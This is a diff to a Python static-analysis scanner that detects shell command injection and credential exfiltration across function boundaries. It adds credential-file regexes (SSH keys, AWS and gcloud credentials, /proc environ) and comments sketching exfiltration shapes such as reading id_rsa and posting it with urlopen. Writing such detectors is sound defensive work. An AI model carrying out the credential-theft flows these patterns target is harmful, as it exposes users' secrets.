+    # become a shell/interpreter/re-exec wrapper (`["bash"] + args` can carry `-c` in
+    # `args`, exactly B-953's `.extend()` case): those keep the crit default. The right
+    # operand is kept as one more argv element so the rest of this branch still sees it.
+    if (
+        isinstance(first, ast.BinOp)
+        and isinstance(first.op, ast.Add)
+        and isinstance(first.left, (ast.List, ast.Tuple))
+        and first.left.elts
+        and (
+            (
+                isinstance(first.left.elts[0], ast.Constant)
+                and isinstance(first.left.elts[0].value, str)
+                and not _prog_name_could_become_shell_indirect(first.left.elts)
+            )
+            # B-1040: `[sys.executable, "tool.py"] + rest` -- the current interpreter reads
+            # as python3, so only a closed option list (script / `-m mod`) is trusted
+            or (
+                tree is not None
+                and _is_sys_executable(
+                    first.left.elts[0], _call_scope(node, owner_map, tree),
+                    getattr(node, "lineno", 0), tree,
+                )
+                and not _prog_name_could_become_shell_indirect(
+                    [_SYSEXE_AS_PYTHON, *first.left.elts[1:]]
+                )
+            )
+        )
+    ):
+        first = ast.List(elts=[*first.left.elts, first.right], ctx=ast.Load())
     if isinstance(first, (ast.List, ast.Tuple)):
         prog = first.elts[0] if first.elts else None
         # B-956: `prog` can be `ast.Starred(value=ast.Name(...))` --
@@ -5856,16 +7119,41 @@ def _subprocess_taint_is_command_injection(
         # is ITSELF a shell/indirect-execution interpreter -- the rest of the argv
         # list is text that interpreter parses and runs, not inert execve data (see
         # _argv0_is_shell_indirect_exec's docstring, layer 2's identical check below).
-        if _argv0_is_shell_indirect_exec(first.elts):
+        # B-1042: `flag = "-c"; ["sh", flag, q]` -- a single-literal binding in a flag
+        # position is resolved, and an unreadable element where a shell's option list could
+        # still hold `-c` convicts a tainted element AFTER it (an element at or before it
+        # is only the script path / a flag, never a command string)
+        p_elts, p_opaque = first.elts, None
+        if tree is not None:
+            p_elts, p_opaque = _b1042_resolve_flags(
+                first.elts, _call_scope(node, owner_map, tree), getattr(node, "lineno", 0)
+            )
+        if _argv0_is_shell_indirect_exec(p_elts):
+            tail = p_elts[1:]
+        elif p_opaque is not None:
+            tail = p_elts[p_opaque + 1:]
+        else:
+            tail = None
+        if tail is not None:
             rest_names = set()
-            for elt in first.elts[1:]:
+            for elt in tail:
                 rest_names |= _names_in(elt)
             if (rest_names & tainted) or (
-                ref_res is not None and any(ref_res.source_in(e) for e in first.elts[1:])
+                ref_res is not None and any(ref_res.source_in(e) for e in tail)
             ):
                 return True  # tainted arg handed to a shell/interpreter -> command injection
         return False  # only a non-program argv element is tainted -> argument injection
 
+    # B-1041: a bare Name that is not one single binding (rebound among branches, grown
+    # by `cmd = cmd + [...]`) but whose EVERY assignment is a literal list headed by a
+    # fixed non-shell program -- the head is known safe, so a tainted element is only an
+    # argument. Any other assignment keeps the unresolved-Name crit below.
+    if isinstance(first, ast.Name) and tree is not None:
+        # only when the sink sits DIRECTLY in the Module / FunctionDef whose body holds the
+        # literal assignments (not in a lambda, comprehension, class body or decorator)
+        b1041_scope = _b1041_binding_scope(node, tree)
+        if b1041_scope is not None and _b1041_name_keeps_fixed_head(b1041_scope, first.id, tree):
+            return False
     # B-413 layer 2: `first` is a bare, unresolved Name -- possibly the wrapper's OWN
     # parameter, which is genuinely tainted at THIS scope (layer 1 is correct about
     # that) but may still be safe if EVERY intra-file call site binds it to a
@@ -6406,6 +7694,12 @@ _FOLDED_CRED_PATH_RE = re.compile(
     # string right after "gcloud" is sufficient to exclude "gcloud-helper" while still
     # matching the real ".config/gcloud/legacy_credentials/..." shape.
     r"|\.config/gcloud(?=/|$)"
+    # B-1060: the OpenClaw credential store, so a pathlib path-join
+    # (`Path.home()/".openclaw"/"openclaw.json"`) that never spells the path as one
+    # contiguous literal is caught the same way the literal scan (_CRED_PATH_RE) now is.
+    # Two fixed filenames, no bare-prefix collision risk, so no right-hand lookahead is
+    # needed here (unlike the gcloud directory above).
+    r"|\.openclaw/(?:openclaw\.json|credentials)"
     r"|/proc/(?:self|\d+)/environ",
     re.I,
 )
@@ -6756,6 +8050,28 @@ def _fold_fs_path_uncached(
             return None
         return _fold_pjoin(_FOLD_UNK if left is None else left, _FOLD_UNK if right is None else right)
 
+    if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
+        # B-1057: string concatenation of path parts -- `"id_" + "rsa"` -> "id_rsa", or
+        # `os.environ["HOME"] + "/.aws/credentials"` -> "\x00/.aws/credentials". An
+        # UNKNOWN side folds to the _FOLD_UNK sentinel (never a substring of any Gate-V
+        # pattern), so a credential filename spelled wholly in the KNOWN parts still
+        # completes a match while an unknown prefix/suffix can only WIDEN the span, never
+        # complete it -- the identical fail-closed discipline the `/` (Div) branch above
+        # uses (an earlier version returned None whenever EITHER side was unknown, which
+        # was fail-OPEN: a known `.aws/credentials` tail was dropped because an unrelated
+        # `os.environ[...]` prefix did not resolve). Arithmetic/list `+` stays excluded by
+        # bailing when a side is a NON-STRING constant (`1 + 2`, `b"x" + b"y"`, `[a]+[b]`,
+        # and the mixed `1 + "x"` which is a runtime TypeError, never a path) and when
+        # BOTH sides are unresolved (no path content at all to fold).
+        for side in (node.left, node.right):
+            if isinstance(side, ast.Constant) and not isinstance(side.value, str):
+                return None
+        left = _fold_seg(node.left, ctx, visiting, depth + 1)
+        right = _fold_seg(node.right, ctx, visiting, depth + 1)
+        if left is None and right is None:
+            return None
+        return (_FOLD_UNK if left is None else left) + (_FOLD_UNK if right is None else right)
+
     if not isinstance(node, ast.Call):
         return None
     f = node.func
@@ -6855,7 +8171,11 @@ def _has_cred_path_const(node: ast.AST, ctx: "_FsFoldCtx | None" = None) -> bool
 # constructor-shaped call (attr starts uppercase, or the literal "socket" module-level
 # factory) seeds an alias, so an unrelated `x = requests.get(url)` response object does
 # NOT retroactively make `x.put(...)` a sink for something that isn't request-shaped.
-_NET_SINK_CTOR_BASES = frozenset({"socket"})  # base.attr() ctor pairs beyond CapitalCase
+# base.attr() ctor pairs recognized beyond CapitalCase. B-1058: `socket.create_connection`
+# / `create_server` return a connected socket a later `s.sendall(...)` writes to; without
+# them `s = socket.create_connection(...)` never registered as a sink alias (only the
+# lowercase `socket.socket()` did), so a credential sent over that socket read INSTALL.
+_NET_SINK_CTOR_BASES = frozenset({"socket", "create_connection", "create_server"})
 # Full dotted-path spellings (via _dotted_path) recognized as networking constructor
 # MODULES, on top of the single-segment _NET_SINK_BASES lookup. Needed for a submodule
 # whose _attr_base last-segment alone isn't trustworthy as a bare base -- e.g.
@@ -7254,6 +8574,25 @@ def _socket_stdio_shell_findings(tree: ast.AST) -> list:
 
 
 def _is_net_sink(func: ast.AST, net_sink_aliases: frozenset[str] = frozenset()) -> bool:
+    # B-1058: `getattr(X, "urlopen")(...)` with a CONSTANT attr name is deterministic --
+    # it is exactly `X.urlopen` -- so resolve it to the same (attr, base) test. A
+    # NON-constant attr name (`getattr(X, var)`) stays the declared dynamic-dispatch
+    # ceiling and is not resolved here.
+    if (
+        isinstance(func, ast.Call)
+        and isinstance(func.func, ast.Name)
+        and func.func.id == "getattr"
+        and len(func.args) >= 2
+        and isinstance(func.args[1], ast.Constant)
+        and isinstance(func.args[1].value, str)
+    ):
+        attr = func.args[1].value
+        if attr in _NET_SINK_ATTRS_ANY or attr == "urlopen":
+            return True
+        if attr in _NET_SINK_ATTRS_BASED:
+            base = _attr_base(func.args[0])
+            return base in _NET_SINK_BASES or base in net_sink_aliases
+        return False
     if isinstance(func, ast.Name):
         return func.id == "urlopen"
     if isinstance(func, ast.Attribute):
@@ -7460,6 +8799,964 @@ def _is_incluster_auth_exempt(node: ast.Call, hit_names: set, str_map: dict) -> 
     if not any(hit_names & _names_in(s) for s in auth_subtrees):
         return False  # tainted name isn't actually in an auth position at all
     return _resolves_to_incluster_host(non_auth_subtrees, str_map)
+
+
+# B-1047: cross-function credential flow (one helper hop and beyond, linear-time).
+#
+# The same-scope CRED_EXFIL_FLOW pass above is name-based and file-wide, so a flow split
+# across a function boundary -- `def collect(): return open(".ssh/id_rsa").read()`,
+# `def upload(p): urlopen(Request(url, data=p.encode()))`, `upload(collect())` -- slipped
+# through it twice over: the credential leaves `collect` through a `return` (which no
+# Assign sees) and enters the sink through a PARAMETER (which `_cred_tainted_names`
+# deliberately never taints, or every `def f(x): requests.post(url, data=x)` would fire).
+# This pass answers both halves with one scoped origin-propagation per function:
+#   * origins: "#" (a credential-path read), "I" (the in-cluster service-account token
+#     only), "f:<k>" (the return value of local def k), "p:<name>" (a parameter).
+#   * a function is CRED-RETURNING when its return/yield carries "#" or an "f:" origin that
+#     is itself cred-returning (reverse-BFS over the call graph: linear, exact, no depth cap).
+#   * (def, param) is a SINK PARAM when that parameter reaches a recognised net sink, directly
+#     or through a call into another sink param (same BFS).
+#   * a conviction is a cred-derived value (a "#" origin, a cred-returning call, an inline
+#     credential read) reaching a net sink in the same scope, OR being passed to a sink param.
+# Scoped, not file-wide: the loop/with/container bindings added here (which the old pass
+# never modelled -- `for p in creds: data[str(p)] = p.read_text()` was missed even in ONE
+# function) must not leak a loop variable named `p` into every other function.
+# Mirrors the old pass's in-cluster carve-out: an "I"-only flow is exempt exactly when
+# `_is_incluster_auth_exempt` holds at the sink, and through a helper only when it holds at
+# EVERY sink call the parameter reaches.
+# Limits (declared, not silent): out-of-file callees, attribute calls other than
+# self./cls. on the enclosing class, a def stored in a variable/dict/Thread(target=...),
+# closures reading an enclosing function's local, `global X` writes, decorators that wrap.
+# A pair-count overflow (_XF_MAX_PAIRS) fails CLOSED: the scope is treated as returning a
+# credential and every parameter as reaching a sink.
+_XF_MAX_PAIRS = 200_000
+_XF_CONTAINER_ADD = frozenset(
+    {"append", "add", "extend", "update", "insert", "appendleft", "setdefault", "write", "writelines"}
+)
+_XF_READ_ATTRS = frozenset(
+    {"open", "read", "read_text", "read_bytes", "readlines", "readline", "load"}
+)
+
+
+def _xf_scope_nodes(body):
+    """Every node in *body* without entering a nested def/class (lambdas are folded into the enclosing scope) (its own scope)."""
+    stack = list(reversed(body))
+    while stack:
+        n = stack.pop()
+        yield n
+        if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
+            continue
+        stack.extend(reversed(list(ast.iter_child_nodes(n))))
+
+
+def _xf_target_names(t: ast.AST):
+    if isinstance(t, ast.Name):
+        yield t.id
+    elif isinstance(t, (ast.Tuple, ast.List)):
+        for e in t.elts:
+            yield from _xf_target_names(e)
+    elif isinstance(t, ast.Starred):
+        yield from _xf_target_names(t.value)
+    elif isinstance(t, ast.Attribute):
+        # `self.x = v` / `cls.x = v`: a CLASS-wide slot, keyed "@x" (never the bare name
+        # `self` -- tainting that would taint every `self.y`). Other receivers
+        # (`obj.x = v`) are not followed.
+        if isinstance(t.value, ast.Name) and t.value.id in ("self", "cls"):
+            yield "@" + t.attr
+    elif isinstance(t, ast.Subscript):
+        # `d[k] = v` stores INTO d; `self.d[k] = v` into the slot "@d".
+        b = t.value
+        while isinstance(b, ast.Subscript):
+            b = b.value
+        if isinstance(b, ast.Name):
+            yield b.id
+        elif isinstance(b, ast.Attribute):
+            yield from _xf_target_names(b)
+
+
+def _xf_plain_names(t: ast.AST):
+    """Names a target statement REBINDS (not a subscript/attribute store into one)."""
+    if isinstance(t, ast.Name):
+        yield t.id
+    elif isinstance(t, (ast.Tuple, ast.List)):
+        for e in t.elts:
+            yield from _xf_plain_names(e)
+    elif isinstance(t, ast.Starred):
+        yield from _xf_plain_names(t.value)
+
+
+def _xf_refs(node: ast.AST) -> set:
+    """Names plus `self.x` / `cls.x` slots ("@x") read anywhere in *node*."""
+    out = set()
+    for n in ast.walk(node):
+        if isinstance(n, ast.Name):
+            out.add(n.id)
+        elif (
+            isinstance(n, ast.Attribute)
+            and isinstance(n.value, ast.Name)
+            and n.value.id in ("self", "cls")
+        ):
+            out.add("@" + n.attr)
+    return out
+
+
+_XF_MAX_PROSE_WORDS = 16
+# B-1085: the generic alternatives of `_CRED_PATH_RE` that are plain words, not paths: a bare
+# `id_rsa`/`id_ed25519`/`Cookies`, and `/secret(s)` / `/.secret(s)` as one prose segment.
+_XF_BARE_WORD_HIT_RE = re.compile(r"id_rsa|id_ed25519|cookies|/\.?secrets?", re.I)
+
+
+def _xf_path_shaped_cred_hit(token: str, m) -> bool:
+    """B-1085: *m* (a `_CRED_PATH_RE` match inside *token*) is a real credential PATH, not a
+    bare credential word that happens to sit in a long sentence. The token must carry a path
+    separator, and a generic word-shaped alternative only counts when the token itself is an
+    anchored multi-segment path (`/run/secrets/x`, `~/.secrets/x`) -- never
+    `the token/secret/key/...` prose, nor a lone `/secrets`."""
+    if "/" not in token:
+        return False
+    if _XF_BARE_WORD_HIT_RE.fullmatch(m.group(0)):
+        return token.startswith(("/", "~")) and token.count("/") >= 2
+    return True
+
+
+def _xf_const_names_cred(value: str):
+    """'other' | 'incluster' | None for one string constant.
+
+    Anti-prose gate by WORD COUNT, not length: a prompt that merely says "secret"
+    (measured: security-guidance's 34 KB llm.py rubric matching `/secrets?\\b`) has
+    thousands of words, a path has a handful. The match is tested on every whitespace
+    token both raw and lexically normalised (repeated `/`, `./` and `x/../` collapsed), so
+    padding a real credential path with slashes or dot-segments -- however long -- still
+    reads as that path.
+
+    B-1085: the word gate only silences BARE-WORD matches. In a constant over the word
+    limit a token that is itself a path to a credential file (`~/.ssh/id_rsa`, see
+    `_xf_path_shaped_cred_hit`) still classifies, so a long sentence-like constant
+    embedding a real credential path is not laundered by its own length."""
+    toks = value.split()
+    long_ = len(toks) > _XF_MAX_PROSE_WORDS
+    for t in toks or [value]:
+        if long_ and "/" not in t:
+            continue
+        for cand in (t, posixpath.normpath(t)):
+            if _INCLUSTER_TOKEN_PATH_RE.search(cand):
+                return "incluster"
+            m = _CRED_PATH_RE.search(cand)
+            if m and (not long_ or _xf_path_shaped_cred_hit(cand, m)):
+                return "other"
+    return None
+
+
+def _xf_extra_bound(body) -> set:
+    """B-1084: names a scope binds that `_own_bound_names` deliberately does not report --
+    lambda parameters and comprehension targets (both folded into the enclosing scope by
+    `_xf_scope_nodes`), and global/nonlocal-declared names (a write through one rebinds the
+    OUTER binding). Used only to fail closed when deciding whether a module constant is
+    still what a bare name refers to."""
+    out: set = set()
+    for n in _xf_scope_nodes(body):
+        if isinstance(n, ast.Lambda):
+            a = n.args
+            out.update(x.arg for x in (*a.posonlyargs, *a.args, *a.kwonlyargs))
+            if a.vararg:
+                out.add(a.vararg.arg)
+            if a.kwarg:
+                out.add(a.kwarg.arg)
+        elif isinstance(n, ast.comprehension):
+            out |= _assign_target_names(n.target)
+        elif isinstance(n, (ast.Global, ast.Nonlocal)):
+            out.update(n.names)
+    return out
+
+
+_XF_NS_FNS = frozenset({"globals", "vars", "locals"})
+_XF_NS_READ_METHODS = frozenset({"get", "keys", "values", "items", "copy", "__getitem__", "__contains__"})
+
+
+def _xf_decl_rebound_names(tree: ast.AST) -> set:
+    """B-1086: names ASSIGNED (assign/aug/ann/for/with/walrus/import/def/class/except/match/
+    del) from a scope that declares them `global` or `nonlocal`. Such a write rebinds the
+    OUTER binding, and the writing scope need not be on the lexical chain between a use and
+    the binding's owner (a sibling function with `global X`, a nested function with
+    `nonlocal X`), so the chain walk in `str_resolves` cannot see it. File-wide and
+    name-keyed on purpose: any such write makes the name unresolvable everywhere. A bare
+    declaration with no write (`global X; return X`) is not a rebinding."""
+    out: set = set()
+    scopes = [tree] + [
+        n
+        for n in ast.walk(tree)
+        if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef))
+    ]
+    for sc in scopes:
+        nodes = list(_xf_scope_nodes(getattr(sc, "body", [])))
+        declared: set = set()
+        for n in nodes:
+            if isinstance(n, (ast.Global, ast.Nonlocal)):
+                declared.update(n.names)
+        if not declared:
+            continue
+        written: set = set()
+        for n in nodes:
+            if isinstance(n, ast.Name) and isinstance(n.ctx, (ast.Store, ast.Del)):
+                written.add(n.id)
+            elif isinstance(n, (ast.Import, ast.ImportFrom)):
+                for a in n.names:
+                    written.add((a.asname or a.name).split(".")[0])
+            elif isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
+                written.add(n.name)
+            elif isinstance(n, ast.ExceptHandler) and n.name:
+                written.add(n.name)
+            elif isinstance(n, (ast.MatchAs, ast.MatchStar)) and n.name:
+                written.add(n.name)
+            elif isinstance(n, ast.MatchMapping) and n.rest:
+                written.add(n.rest)
+        out |= written & declared
+    return out
+
+
+def _xf_has_dynamic_ns_write(tree: ast.AST) -> bool:
+    """B-1086: True when the file can rebind a module-level name by a route no static name
+    analysis follows -- `globals()[k] = v`, `vars()` / `locals()` writes, `globals().update`,
+    `<obj>.__dict__[k] = v`, `setattr` / `delattr` on anything but `self` / `cls`,
+    `sys.modules[__name__]` / `sys.modules["__main__"]`, `import __main__`, any `exec` / `eval`,
+    `importlib.import_module(x)` / `__import__(x)` unless x is a literal other than "__main__", an alias of
+    `globals()` / `vars()` / `locals()` / `__dict__`. Fails closed: a read-only use
+    (`globals().get(k)`, `k in globals()`, `**locals()`, `"..." % locals()`) is not a write."""
+    parent: dict = {}
+    for p in ast.walk(tree):
+        for ch in ast.iter_child_nodes(p):
+            parent[ch] = p
+
+    def read_only(n):
+        up = parent.get(n)
+        if isinstance(up, ast.Subscript) and up.value is n and isinstance(up.ctx, ast.Load):
+            return True
+        if isinstance(up, ast.Attribute) and up.value is n and up.attr in _XF_NS_READ_METHODS:
+            return True
+        if isinstance(up, ast.Compare):
+            return True
+        if isinstance(up, ast.keyword) and up.arg is None:  # `f(**locals())`
+            return True
+        if isinstance(up, ast.BinOp) and isinstance(up.op, ast.Mod):  # `"%(x)s" % locals()`
+            return True
+        return False
+
+    for n in ast.walk(tree):
+        if isinstance(n, ast.Call):
+            f = n.func
+            if isinstance(f, ast.Name) and f.id in _XF_NS_FNS and not read_only(n):
+                return True
+            if isinstance(f, ast.Name) and f.id in ("setattr", "delattr"):
+                first = n.args[0] if n.args else None
+                if not (isinstance(first, ast.Name) and first.id in ("self", "cls")):
+                    return True
+            fname = f.id if isinstance(f, ast.Name) else (f.attr if isinstance(f, ast.Attribute) else "")
+            # exec/eval run code the static walk never sees (`exec("API = ...")`,
+            # `eval("(API := ...)")`), bare or via `builtins.exec`.
+            if fname in ("exec", "eval"):
+                return True
+            # a self-import hands back the live module object; any non-literal name could be
+            # this module too. A literal naming another module is not a route to this one.
+            if fname in ("import_module", "__import__"):
+                first = n.args[0] if n.args else None
+                if first is None:
+                    first = next((k.value for k in n.keywords if k.arg in ("name", "name_")), None)
+                if not (
+                    isinstance(first, ast.Constant)
+                    and isinstance(first.value, str)
+                    and first.value != "__main__"
+                ):
+                    return True
+        elif isinstance(n, ast.Attribute):
+            if n.attr in ("__dict__", "f_globals") and not read_only(n):
+                return True
+        elif isinstance(n, ast.Subscript):
+            v = n.value
+            if (
+                isinstance(v, ast.Attribute)
+                and v.attr == "modules"
+                and isinstance(v.value, ast.Name)
+                and v.value.id == "sys"
+            ):
+                sl = n.slice
+                if (isinstance(sl, ast.Name) and sl.id == "__name__") or (
+                    isinstance(sl, ast.Constant) and sl.value == "__main__"
+                ):
+                    return True
+        elif isinstance(n, (ast.Import, ast.ImportFrom)):
+            if any(a.name == "__main__" for a in n.names) or (
+                isinstance(n, ast.ImportFrom) and n.module == "__main__"
+            ):
+                return True
+    return False
+
+
+def _xf_cred_class(node: ast.AST, ctx) -> str:
+    """`_cred_source_classification` restricted to PATH-SHAPED constants (see
+    `_xf_const_names_cred`). The same-scope pass tolerates a prose constant because a
+    tainted name must itself reach a sink call; across a call boundary it would carry an
+    800-line prompt constant into every helper that forwards it."""
+    has_incluster = False
+    has_other = False
+    for n in ast.walk(node):
+        if isinstance(n, ast.Constant) and isinstance(n.value, str):
+            k = _xf_const_names_cred(n.value)
+            if k == "incluster":
+                has_incluster = True
+            elif k == "other":
+                has_other = True
+    if not has_other and ctx is not None and _has_folded_cred_path(node, ctx):
+        has_other = True
+    if has_other:
+        return "other"
+    return "incluster" if has_incluster else "none"
+
+
+def _xf_inline_cred_read(node: ast.AST, ctx) -> bool:
+    """A read call (open/read_text/...) whose own subtree names a credential path --
+    i.e. the secret's CONTENTS, not merely a URL string that mentions `.npmrc`."""
+    for c in ast.walk(node):
+        if not isinstance(c, ast.Call):
+            continue
+        f = c.func
+        if (isinstance(f, ast.Name) and f.id == "open") or (
+            isinstance(f, ast.Attribute) and f.attr in _XF_READ_ATTRS
+        ):
+            if _xf_cred_class(c, ctx) == "other":
+                return True
+    return False
+
+
+class _XfDef:
+    __slots__ = ("node", "cls", "params", "pos", "vararg", "kwarg", "kwonly", "idx")
+
+    def __init__(self, node, cls, idx):
+        self.node, self.cls, self.idx = node, cls, idx
+        a = node.args
+        pos = [x.arg for x in (*a.posonlyargs, *a.args)]
+        static = any(
+            isinstance(d, ast.Name) and d.id == "staticmethod" for d in node.decorator_list
+        )
+        if cls is not None and pos and not static:
+            pos = pos[1:]  # self / cls
+        self.pos = pos
+        self.kwonly = [x.arg for x in a.kwonlyargs]
+        self.vararg = a.vararg.arg if a.vararg else None
+        self.kwarg = a.kwarg.arg if a.kwarg else None
+        self.params = [*pos, *self.kwonly, *([self.vararg] if self.vararg else []),
+                       *([self.kwarg] if self.kwarg else [])]
+
+
+def _xf_collect_defs(tree: ast.AST):
+    defs: list = []
+    stack = [(tree, None)]
+    while stack:
+        node, cls = stack.pop()
+        for ch in ast.iter_child_nodes(node):
+            if isinstance(ch, ast.ClassDef):
+                stack.append((ch, ch))
+            elif isinstance(ch, (ast.FunctionDef, ast.AsyncFunctionDef)):
+                defs.append(_XfDef(ch, cls, len(defs)))
+                stack.append((ch, None))
+            else:
+                stack.append((ch, cls))
+    return defs
+
+
+def _xf_arg_targets(d: "_XfDef", args, keywords):
+    """[(param_name, arg_subtree)] -- which parameter of *d* each argument feeds. A
+    starred/double-starred argument feeds EVERY parameter (fail closed)."""
+    out = []
+    for i, a in enumerate(args):
+        if isinstance(a, ast.Starred):
+            out.extend((p, a.value) for p in d.params)
+        elif i < len(d.pos):
+            out.append((d.pos[i], a))
+        elif d.vararg:
+            out.append((d.vararg, a))
+    for kw in keywords:
+        if kw.arg is None:
+            out.extend((p, kw.value) for p in d.params)
+        elif kw.arg in d.pos or kw.arg in d.kwonly:
+            out.append((kw.arg, kw.value))
+        elif d.kwarg:
+            out.append((d.kwarg, kw.value))
+    return out
+
+
+_XF_THREADY = frozenset({"Thread", "Process", "Timer"})
+
+
+def _xf_star(expr: ast.AST) -> ast.AST:
+    return ast.Starred(value=expr, ctx=ast.Load())
+
+
+def _xf_call_views(call: ast.Call):
+    """[(callee_expr, args, keywords)] -- the call itself, plus the callee a dispatcher
+    forwards its arguments to: Thread/Process/Timer(target=F, args=(...)),
+    pool.submit(F, ...), loop.run_in_executor(ex, F, ...), asyncio.to_thread(F, ...),
+    functools.partial(F, ...), map(F, xs). A non-literal `args=`/`kwargs=` is passed as a
+    starred/double-starred expression, which feeds EVERY parameter (fail closed)."""
+    views = [(call.func, call.args, call.keywords)]
+    f = call.func
+    name = f.id if isinstance(f, ast.Name) else f.attr if isinstance(f, ast.Attribute) else ""
+    kw = {k.arg: k.value for k in call.keywords if k.arg}
+    if name in _XF_THREADY:
+        fn = kw.get("target") or kw.get("function")
+        if fn is None and name == "Timer" and len(call.args) > 1:
+            fn = call.args[1]
+        if fn is not None:
+            a = kw.get("args")
+            args = list(a.elts) if isinstance(a, (ast.Tuple, ast.List)) else (
+                [_xf_star(a)] if a is not None else []
+            )
+            k = kw.get("kwargs")
+            kws = (
+                [ast.keyword(arg=None, value=k)] if k is not None else []
+            )
+            views.append((fn, args, kws))
+    elif name in ("submit", "to_thread", "partial") and call.args:
+        views.append((call.args[0], call.args[1:], call.keywords))
+    elif name == "run_in_executor" and len(call.args) > 1:
+        views.append((call.args[1], call.args[2:], call.keywords))
+    elif name == "map" and len(call.args) > 1:
+        views.append((call.args[0], [_xf_star(x) for x in call.args[1:]], []))
+    return views
+
+
+class _XfScope:
+    """One scope's bindings, calls and returns, and its origin propagation result."""
+
+    def __init__(self, body, params, cls):
+        self.params = params
+        self.cls = cls
+        self.bindings: list = []  # (targets:list[str], value:ast)
+        self.calls: list = []
+        self.returns: list = []
+        self.plain: set = set()  # names this scope rebinds
+        self.stored: set = set()  # names this scope stores INTO (d[k] = v, d.append(v))
+        for n in _xf_scope_nodes(body):
+            if isinstance(n, (ast.Assign, ast.AugAssign, ast.AnnAssign)):
+                for t in n.targets if isinstance(n, ast.Assign) else [n.target]:
+                    self.plain.update(_xf_plain_names(t))
+                    self.stored.update(set(_xf_target_names(t)) - set(_xf_plain_names(t)))
+            elif isinstance(n, (ast.For, ast.AsyncFor)):
+                self.plain.update(_xf_plain_names(n.target))
+            elif isinstance(n, (ast.With, ast.AsyncWith)):
+                for it in n.items:
+                    if it.optional_vars is not None:
+                        self.plain.update(_xf_plain_names(it.optional_vars))
+            if isinstance(n, ast.Assign):
+                ts = [x for t in n.targets for x in _xf_target_names(t)]
+                self.bindings.append((ts, n.value))
+            elif isinstance(n, ast.AugAssign):
+                self.bindings.append((list(_xf_target_names(n.target)), n.value))
+            elif isinstance(n, ast.AnnAssign) and n.value is not None:
+                self.bindings.append((list(_xf_target_names(n.target)), n.value))
+            elif isinstance(n, ast.NamedExpr):
+                self.bindings.append((list(_xf_target_names(n.target)), n.value))
+            elif isinstance(n, (ast.For, ast.AsyncFor)):
+                self.bindings.append((list(_xf_target_names(n.target)), n.iter))
+            elif isinstance(n, (ast.With, ast.AsyncWith)):
+                for it in n.items:
+                    if it.optional_vars is not None:
+                        self.bindings.append(
+                            (list(_xf_target_names(it.optional_vars)), it.context_expr)
+                        )
+            elif isinstance(n, ast.comprehension):
+                self.bindings.append((list(_xf_target_names(n.target)), n.iter))
+            elif isinstance(n, ast.Call):
+                self.calls.append(n)
+                f = n.func
+                if (
+                    isinstance(f, ast.Attribute)
+                    and f.attr in _XF_CONTAINER_ADD
+                    and isinstance(f.value, ast.Name)
+                ):
+                    self.stored.add(f.value.id)
+                    for v in (*n.args, *(k.value for k in n.keywords)):
+                        self.bindings.append(([f.value.id], v))
+            elif isinstance(n, ast.Return) and n.value is not None:
+                self.returns.append(n.value)
+            elif isinstance(n, (ast.Yield, ast.YieldFrom)) and n.value is not None:
+                self.returns.append(n.value)
+
+
+def _xf_cred_flow_findings(tree, source_ctx, net_sink_aliases):
+    """[(lineno, detail)] for cross-function / scoped credential-to-sink flows."""
+    ctx = source_ctx
+    defs = _xf_collect_defs(tree)
+    by_name: dict = {}
+    methods: dict = {}
+    for d in defs:
+        if d.cls is None:
+            by_name.setdefault(d.node.name, []).append(d.idx)
+        else:
+            methods.setdefault((id(d.cls), d.node.name), []).append(d.idx)
+
+    classes: dict = {}
+    for cn in ast.walk(tree):
+        if isinstance(cn, ast.ClassDef):
+            classes.setdefault(cn.name, []).append(cn)
+
+    def methods_of(cnode, attr, seen=None):
+        """Methods named *attr* on a local class, searching local bases (BFS, first
+        class that defines it)."""
+        order = [cnode]
+        visited = {id(cnode)}
+        i = 0
+        while i < len(order) and i < 64:
+            c = order[i]
+            i += 1
+            hit = methods.get((id(c), attr))
+            if hit:
+                return hit
+            for b in c.bases:
+                if isinstance(b, ast.Name):
+                    for bc in classes.get(b.id, ()):
+                        if id(bc) not in visited:
+                            visited.add(id(bc))
+                            order.append(bc)
+        return ()
+
+    # `x = Cls(...)` (file-wide, flow-insensitive) and `f = helper` aliases
+    var_class: dict = {}
+    alias_edges: list = []
+    for an in ast.walk(tree):
+        if isinstance(an, ast.Assign) and len(an.targets) == 1 and isinstance(an.targets[0], ast.Name):
+            tgt, rhs = an.targets[0].id, an.value
+            if isinstance(rhs, ast.Call) and isinstance(rhs.func, ast.Name) and rhs.func.id in classes:
+                var_class.setdefault(tgt, []).extend(classes[rhs.func.id])
+            elif isinstance(rhs, ast.Name):
+                alias_edges.append((tgt, rhs.id))
+    aliases: dict = {}  # name -> def idxs it may be bound to
+    changed_names = list(by_name)
+    by_alias_src: dict = {}
+    for tgt, src in alias_edges:
+        by_alias_src.setdefault(src, []).append(tgt)
+    stack = list(by_name)
+    cur: dict = {k: set(v) for k, v in by_name.items()}
+    while stack:
+        src = stack.pop()
+        for tgt in by_alias_src.get(src, ()):
+            add_set = cur.get(src, set()) - cur.get(tgt, set())
+            if add_set:
+                cur.setdefault(tgt, set()).update(add_set)
+                stack.append(tgt)
+    aliases = {k: sorted(v) for k, v in cur.items()}
+    del changed_names
+
+    def resolve_fn(f, cls):
+        if isinstance(f, ast.Name):
+            return aliases.get(f.id, ())
+        if isinstance(f, ast.Attribute):
+            b = f.value
+            if isinstance(b, ast.Name) and b.id in ("self", "cls") and cls is not None:
+                return methods_of(cls, f.attr)
+            if isinstance(b, ast.Name) and b.id in var_class:
+                out_ = []
+                for c in var_class[b.id]:
+                    out_.extend(methods_of(c, f.attr))
+                return out_
+            if isinstance(b, ast.Call) and isinstance(b.func, ast.Name) and b.func.id in classes:
+                out_ = []
+                for c in classes[b.func.id]:
+                    out_.extend(methods_of(c, f.attr))
+                return out_
+        return ()
+
+    def resolve(call, cls):
+        return resolve_fn(call.func, cls)
+
+    _sm: list = []
+
+    def get_str_map():
+        if not _sm:
+            _sm.append(_simple_str_const_assigns(tree))
+        return _sm[0]
+
+    # B-1084: which names the file-wide string map may resolve FROM INSIDE a given scope.
+    # Fails closed: a name resolves only when it is provably the one literal binding of its
+    # owning scope and provably unbound in every scope between the use and that owner.
+    # "Bound" is `_own_bound_names` (the complete walker: params, assign/for/with/walrus/
+    # import/except/match/def/class/del targets) plus lambda parameters, comprehension
+    # targets and global/nonlocal-declared names (`_xf_extra_bound`) -- a `global X` write
+    # rebinds the module constant itself, so it is treated as a binding, not an exemption.
+    parent_fn: dict = {}
